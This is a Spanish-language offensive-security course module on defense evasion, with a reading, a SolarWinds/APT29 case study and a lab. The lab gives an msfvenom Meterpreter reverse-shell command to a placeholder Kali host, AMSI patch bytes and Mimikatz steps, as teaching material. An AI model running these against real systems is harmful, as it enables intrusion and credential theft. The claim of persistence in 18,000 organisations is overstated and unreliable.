# Semana 13: Evasion de defensas

Curso: [Ciberseguridad Ofensiva: Pensar como Atacante](../syllabus.md) · Semana 13 de 20

## Objetivo de la semana
Comprender los fundamentos técnicos y tácticos de la evasión de defensas en operaciones de red teaming y pentesting, aprendiendo a identificar, sortear y eludir mecanismos de seguridad como EDR, antivirus, firewalls y sistemas de monitoreo. El estudiante aplicará técnicas alineadas con MITRE ATT&CK (TA0005) para simular adversarios reales y evaluar la eficacia de los controles defensivos de una organización.

## LECTURA

La evasión de defensas (Defense Evasion) es la táctica MITRE ATT&CK **TA0005** y agrupa 42 técnicas documentadas que un adversario utiliza para evitar ser detectado durante una intrusión. A diferencia de otras tácticas orientadas a la ejecución o persistencia, la evasión es transversal: puede ocurrir antes, durante y después de comprometer un host. En el marco de MITRE ATT&CK, técnicas clave incluyen **T1027 (Obfuscated Files or Information)**, **T1055 (Process Injection)**, **T1070 (Indicator Removal)**, **T1562 (Impair Defenses)**, **T1620 (Reflective Code Loading)** y **T1218 (System Binary Proxy Execution / LOLBins)**.

Desde la perspectiva defensiva, los controles asociados se mapean en el **NIST SP 800-53** (familias SI y AU), los **CIS Controls v8** (especialmente Controles 10 y 13 sobre malware defenses y network monitoring), y el **ISO/IEC 27001:2022 Anexo A 8.7 y 8.16** (protección contra malware y actividades de monitoreo). El **OWASP Top 10** aborda la evasión desde el lado aplicativo en categorías como A03 (Injection) y A08 (Software and Data Integrity Failures), mientras que el **OWASP WSTG** incluye pruebas específicas de bypass de WAF.

Las técnicas de evasión modernas se agrupan en varios dominios:

1. **Ofuscación y cifrado**: uso de packers (UPX, Themida), cifrado de payloads (AES, XOR), codificación (Base64, PowerShell `-enc`), y carga reflectiva en memoria (Cobalt Strike Beacon, Meterpreter). Esto rompe firmas estáticas y heurísticas simples.
2. **Inyección de procesos**: técnicas como `CreateRemoteThread`, `QueueUserAPC`, process hollowing, y **Process Doppelgänging** (T1055.013) permiten ejecutar código en procesos legítimos como `explorer.exe` o `svchost.exe`.
3. **Abuso de binarios firmados (LOLBins/LOLBAS)**: `certutil.exe`, `mshta.exe`, `regsvr32.exe`, `rundll32.exe`, `wmic.exe` para descargar, ejecutar o persistir sin escribir binarios maliciosos en disco (T1218).
4. **Bypass de AMSI y ETW**: parcheo en memoria de `amsi.dll` (`AmsiScanBuffer`) y de proveedores ETW para silenciar telemetría hacia EDR. Herramientas como **AMSI-Bypass**, **SharpBlock**, o **Invisi-Shell** son referencias conocidas.
5. **Living off the Land (LotL)**: uso exclusivo de herramientas nativas del SO (`powershell`, `bitsadmin`, `schtasks`, `wmic`) para minimizar el footprint.
6. **Evasion de red**: domain fronting, DoH/DoT, túneles DNS, y uso de C2 sobre protocolos legítimos (HTTPS, SMB) para evadir inspección perimetral.

Los EDR modernos (CrowdStrike Falcon, SentinelOne, Defender for Endpoint) combinan telemetría de kernel (ETW, callbacks), análisis de comportamiento y ML, por lo que la evasión efectiva requiere una comprensión profunda de las **API de Windows** (ntdll, kernel32), **syscalls directas** (Hell's Gate, Halo's Gate, FreshyCalls), y el uso de **unhooking** de DLLs (`ntdll.dll` hooks removidos mediante mapeo limpio desde disco). El estándar **MITRE D3FEND** ofrece contramedidas específicas por técnica, y **Atomic Red Team** proporciona pruebas atómicas para validar detecciones.

Éticamente, estas técnicas solo deben ejecutarse en entornos autorizados, bajo contratos de pentesting con alcance definido, y siempre alineadas con marcos como **PTES** (Penetration Testing Execution Standard) y **OWASP Testing Guide**.

## EJERCICIO

**Objetivo**: Ejecutar un bypass de AMSI y cargar un payload reflectivo en memoria en una VM Windows 10/11 de laboratorio (aislada, sin red externa), verificando la evasión contra Windows Defender.

**Requisitos previos**:
- VM Windows 10/11 con Defender activo y actualizado.
- VM Kali Linux o Parrot OS en la misma red host-only.
- Snapshot previo de la VM Windows.
- Herramientas: `Invoke-Obfuscation`, `AMSI-Bypass` de `S3cur3Th1sSh1t`, `PowerShell Empire` o `Cobalt Strike (trial)`, `Process Hacker`, `Sysmon` con config de SwiftOnSecurity.

**Pasos**:

1. **Baseline de detección**: Ejecuta en la VM Windows un payload trivial (por ejemplo, `Invoke-Mimikatz` de PowerSploit) y confirma que Defender lo bloquea. Registra el evento en el Visor de Eventos (`Microsoft-Windows-Windows Defender/Operational`).

2. **Ofuscación básica**: Usa `Invoke-Obfuscation` para aplicar `TOKEN\ALL\1` y `AST\ALL\1` al script. Ejecuta y observa si Defender sigue detectando.

3. **Bypass de AMSI**: Carga el script `Amsi-Bypass-Powershell.ps1` y ejecuta la función `Invoke-AmsiBypass` (variante `AmsiScanBuffer` patch). Verifica con `Process Hacker` que el buffer en `amsi.dll` ha sido parcheado (bytes `0xB8 0x57 0x00 0x07 0x80 0xC3`).

4. **Carga reflectiva**: Genera un payload con `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP_KALI> LPORT=443 -f psh-reflection -o payload.ps1`. Ejecuta en la VM Windows tras el bypass de AMSI.

5. **Validación**: Confirma que el handler de Metasploit recibe la sesión. Verifica con Sysmon (Event ID 1, 3, 8, 10) qué telemetría se generó y qué se evadió.

6. **Documentación**: Redacta un informe con: vector inicial, técnicas MITRE ATT&CK usadas (T1059.001, T1562.001, T1620), evidencias de evasión, y recomendaciones defensivas (habilitar ASR rules, Credential Guard, WDAC).

## CASO

**Caso: APT29 (Cozy Bear) y la evasión de defensas en la campaña SolarWinds (2020)**

En diciembre de 2020 se reveló que el grupo APT29, atribuido al SVR ruso, comprometió la cadena de suministro de SolarWinds Orion. Tras insertar código malicioso en la actualización legítima, los atacantes ejecutaron una sofisticada fase de evasión de defensas antes de moverse lateralmente.

Técnicas MITRE ATT&CK observadas:
- **T1027.002 (Software Packing)** y **T1027.005 (Indicator Removal from Tools)**: el backdoor **SUNBURST** permanecía dormido hasta 12-14 días tras la infección, y solo se activaba si no detectaba herramientas de análisis (procesos de sandbox, nombres de dominio de vendors).
- **T1070.004 (File Deletion)** y **T1070.006 (Timestomp)**: los atacantes eliminaban artefactos y modificaban timestamps para dificultar el análisis forense.
- **T1562.001 (Disable or Modify Tools)**: deshabilitaban temporalmente logging y usaban **TEARDROP** y **RAINDROP** para cargar payloads en memoria sin tocar disco.
- **T1218.011 (Rundll32)**: uso de binarios firmados para ejecución de código.
- **T1550.001 (Application Access Token)** y **T1550.004 (Web Session Cookie)**: robo de tokens para moverse lateralmente hacia servicios federados.

El actor logró persistir en más de 18.000 organizaciones, incluyendo agencias del gobierno de EE. UU. La lección clave: la evasión no es solo técnica, es **operacional y de timing**. Los controles del **NIST SP 800-53 SI-3, SI-4, AU-6** y los **CIS Controls 8, 10, 13** deben complementarse con **threat hunting proactivo**, **EDR con telemetría de kernel**, y **modelado de adversarios** basado en MITRE ATT&CK. Tras el incidente, CISA emitió la directiva **ED 21-01** y el estándar **SBOM** ganó tracción para mitigar ataques a la cadena de suministro.

## Recursos abiertos
- MITRE ATT&CK – Defense Evasion (TA0005): https://attack.mitre.org/tactics/TA0005/
- LOLBAS Project (Living Off The Land Binaries): https://lolbas-project.github.io/
- Atomic Red Team (pruebas de detección para técnicas ATT&CK): https://github.com/redcanaryco/atomic-red-team
- MITRE D3FEND (contramedidas defensivas): https://d3fend.mitre.org/
- OWASP WSTG – Testing for WAF Bypass (WSTG-CONF-07): https://owasp.org/www-project-web-security-testing-guide/

--- [Volver al syllabus](../syllabus.md)
